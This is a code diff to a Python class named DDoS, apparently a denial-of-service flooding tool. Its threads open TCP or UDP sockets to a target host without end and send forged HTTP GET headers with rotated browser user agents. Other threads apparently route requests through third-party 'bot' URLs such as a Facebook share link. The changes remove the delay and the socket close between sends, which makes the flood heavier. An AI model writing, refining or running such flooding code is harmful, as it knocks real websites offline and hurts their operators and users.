@@ -37,12 +37,14 @@ class DDoS:
         self.enc = enc
         self.thr = thr
         self.test()
+        self.user_agents()
     def test(self):
         try:
             ip = socket.gethostbyname(self.host)
         except:
             raise self.InvalidIPError
     def user_agents(self):
+        global user_agents
         user_agents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                        'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
                        'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
@@ -60,21 +62,9 @@ class DDoS:
         bots.append("http://www.facebook.com/sharer/sharer.php?u=")
         return bots
     def httpheader(self):
-        header = f"""
-        GET / HTTP/1.1
-        Host: {self.host}
-        
-        User-Agent: {random.choice(self.user_agents())}
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-us,en;q=0.5
-        Accept-Encoding: gzip,deflate
-        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-        Keep-Alive: 115
-        Connection: keep-alive
-        """
+        header = f"GET / HTTP/1.1\nHost: {self.host}\n\nUser-Agent: {random.choice(user_agents)}"
         return header
     def init(self,protocol):
-        global s
         if protocol == "tcp":
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         elif protocol == "udp":
@@ -87,21 +77,13 @@ class DDoS:
         else:
             raise self.UnknownProtocolError()
         return s
-    def sock_conn(self):
-        ip = self.host
-        port = self.port
+    def sock_conn(self, ip, port):
         while True:
             try:
-                self.init(self.protocol)
-                packet = self.httpheader()
-                try:
-                    packet = packet.encode(self.enc)
-                except:
-                    packet = packet.encode('utf-8')
+                s = self.init(self.protocol)
                 s.connect((ip, port))
-                s.send(packet)
-                s.close()
-                time.sleep(0.1)
+                packet = self.httpheader()
+                s.send(packet.encode(self.enc))
             except:
                 pass
     def req_ddos(self):
@@ -113,10 +95,12 @@ class DDoS:
             except:
                 pass
     def start(self):
-        item = 0
-        for i in range(self.thr):
+        ip = self.host
+        port = self.port
+        thr = self.thr
+        for i in range(thr):
             try:
-                dos1 = threading.Thread(target=self.sock_conn)
+                dos1 = threading.Thread(target=self.sock_conn, args=(ip, port))
                 dos1.start()
                 dos2 = threading.Thread(target=self.req_ddos)
                 dos2.start()
